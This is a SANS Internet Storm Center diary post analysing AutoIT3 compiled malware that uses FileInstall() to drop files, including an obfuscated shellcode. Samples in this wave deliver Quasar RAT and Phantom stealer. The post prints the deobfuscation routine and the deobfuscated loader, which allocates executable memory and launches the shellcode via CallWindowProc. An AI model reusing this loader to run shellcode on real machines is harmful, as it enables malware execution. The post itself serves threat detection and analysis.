---
title: AutoIT3 Compiled Scripts Dropping Shellcodes, (Fri, Dec 5th)
url: https://isc.sans.edu/diary/rss/32542
source: SANS Internet Storm Center, InfoCON: green
date: 2025-12-05
fetch_date: 2025-12-06T03:11:53.005698
---

# AutoIT3 Compiled Scripts Dropping Shellcodes, (Fri, Dec 5th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Xavier Mertens](/handler_list.html#xavier-mertens "Xavier Mertens")

Threat Level: [green](/infocon.html)

* [previous](/diary/32536)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/tokyo-winter-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Japan Standard Time | Dec 8th - Dec 12th 2025 |

# [AutoIT3 Compiled Scripts Dropping Shellcodes](/forums/diary/AutoIT3%2BCompiled%2BScripts%2BDropping%2BShellcodes/32542/)

**Published**: 2025-12-05. **Last Updated**: 2025-12-05 07:12:12 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/AutoIT3%2BCompiled%2BScripts%2BDropping%2BShellcodes/32542/#comments)

AutoIT3[[1](https://www.autoitscript.com/site/)] is a powerful language that helps to built nice applications for Windows environments, mainly to automate tasks. If it looks pretty old, the latest version was released last September and it remains popular amongst developers, for the good… or the bad! Malware written in AutoIt3 has existed since the late 2000s, when attackers realized that the language was easy to learn (close to basic) but can also compiled into standalone PE files! From a malware point of view, such executables make an extended use of packed data, making them more stealthy.

If it became less popular, AutoIT3 is still used by some attackers. I found a sample yesterday that (ab)use a nice feature of the language. The sample was delivered in a ZIP archive, containing a PE fille: ENQ-2548871-PO-AYPC-352-25-UN-01162.exe (SHA256:1e75512b85b8ad27966ea850b69290bc18cc010bcb4f0e1ef119b82c99ca96c0). The file has a VT score of 33/72[[2](https://www.virustotal.com/gui/file/1e75512b85b8ad27966ea850b69290bc18cc010bcb4f0e1ef119b82c99ca96c0)].

The technique used by the threat actor relies on the function FileInstall()[[3](https://www.autoitscript.com/autoit3/docs/functions/FileInstall.htm)]. Its purpose is to to include a file into an executed script but… the behavior is subtle and depends on how the script is run. The script call this code:

```

FileInstall ( "inhumation" , @TempDir & "\inhumation" , 1 )
```

How does it work?

* If the script is parsed, the source file must exist all the time.
* If the script is compiled, the file must exist at compile time only! (It is embedded into the PE file)

When the payload was executed, indeed, it created the file ‘inhumation’ in %TEMP%!

Clasically, the remaining code is obfuscated. The magic is perfomed with a simple function LGYJSYH():

```

Func LGYJSYH ( $LVRVBGKY )
    Local $PYYTLPGF = ""
    For $WVILGLOS = 1 To StringLen ( $LVRVBGKY )
        Local $NCMTXMB = Asc ( StringMid ( $LVRVBGKY , $WVILGLOS , 1 ) )
        $PYYTLPGF &= Chr ( $NCMTXMB - ( 1 ^ $WVILGLOS ) )
    Next
    Return $PYYTLPGF
EndFunc
```

The purpose is very simple: it parses a string, and for every character, if converts it with the previous one in the ASCII table (-1). Don't be fooled, the "^" does not reveal some XOR manipulation. In AutoIT, "^" is exponentiation!

In Python, we should have something like this:

```

def LGYJSYH(s):
    return "".join(chr(ord(c) - 1) for c in s)
```

Example:

```

>>> def OZTTVUH(s):
...     return "".join(chr(ord(c) - 1) for c in s)
...
>>> OZTTVUH("lfsofm43")
'kernel32'
```

Two files are loaded via FileInstall() and one of them is an obfuscated shellcode.

![](https://isc.sans.edu/diaryimages/images/isc-20251205-1(1).png)

Here is the technique used by the sample to load and execute it:
(The code has been deobfuscated for easier reading)

```

; Unpack the shellcode on disk
FileInstall ( "buncal" , @TempDir & "\buncal" , 1 )

; Read the shellcode file content
$FMMKSJE = Execute ( "lgyjsyh(FileRead(@TempDir “”\buncal"))" )

; Get the shellcode length
$IXWCTFHCT = BinaryLen ( $FMMKSJE )

; Allocate executable memorty (0x40) to contain the shellcode
$PUJFJJN = DllCall ( “kernel32” , “ptr”, “VirtualAlloc”, “dword" , “0” , “dword”, $IXWCTFHCT, “dword”, “0x3000”, “dword”, “0x40”))[0]

; Prepate the allocated memory as a DLL structure
$QMDAZCZGFO = DllStructCreate ( “byte [“ & $IXWCTFHCT & “]” ) , $PUJFJJN )

; Loads the shellcode in memory
DllStructSetData ( $QMDAZCZGFO , 1 , $FMMKSJE )

; Launch the shellcode!
DllCall ( “user32.dll” , “ptr”, “CallWindowProc”, “ptr”, $PUJFJJN + 9296 , “ptr”, 0 , “ptr”,, 0 , “ptr”, 0 , “ptr”, 0 )
```

I already covered the use of CallWindowProc() to load a shell code in a previous diary[[4](https://isc.sans.edu/diary/Interesting%2BTechnique%2Bto%2BLaunch%2Ba%2BShellcode/32238)]

There is ongoing wave of such samples. I already spotted two samples that use the same technique:

* "ENQ-2548871-PO-AYPC-352-25-UN-01162.exe" (SHA256:1e75512b85b8ad27966ea850b69290bc18cc010bcb4f0e1ef119b82c99ca96c0)
  + Delivers a Quasar RAT:
* ENQ\_DB9002M\_ORDER\_M24093\_2025.exe (SHA256:7eb8ae8f1216a377da6ccd0cee0b21f2700e9bbc46ae3ebfa876e70296aa4539)
  + Delivers a Phantom stealer

Conclusion: Keep an eye on FileInstall() in AutoIT3 scripts!

[1] <https://www.autoitscript.com/site/>
[2] <https://www.virustotal.com/gui/file/1e75512b85b8ad27966ea850b69290bc18cc010bcb4f0e1ef119b82c99ca96c0>
[3] <https://www.autoitscript.com/autoit3/docs/functions/FileInstall.htm>
[4] [https://isc.sans.edu/diary/Interesting+Technique+to+Launch+a+Shellcode/32238](https://isc.sans.edu/diary/Interesting%2BTechnique%2Bto%2BLaunch%2Ba%2BShellcode/32238)

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [AutoIT3](/tag.html?tag=AutoIT3) [Dropper](/tag.html?tag=Dropper) [FileInstall](/tag.html?tag=FileInstall) [Malware](/tag.html?tag=Malware) [ShellCode](/tag.html?tag=ShellCode)

[0 comment(s)](/diary/AutoIT3%2BCompiled%2BScripts%2BDropping%2BShellcodes/32542/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/tokyo-winter-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Japan Standard Time | Dec 8th - Dec 12th 2025 |

* [previous](/diary/32536)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)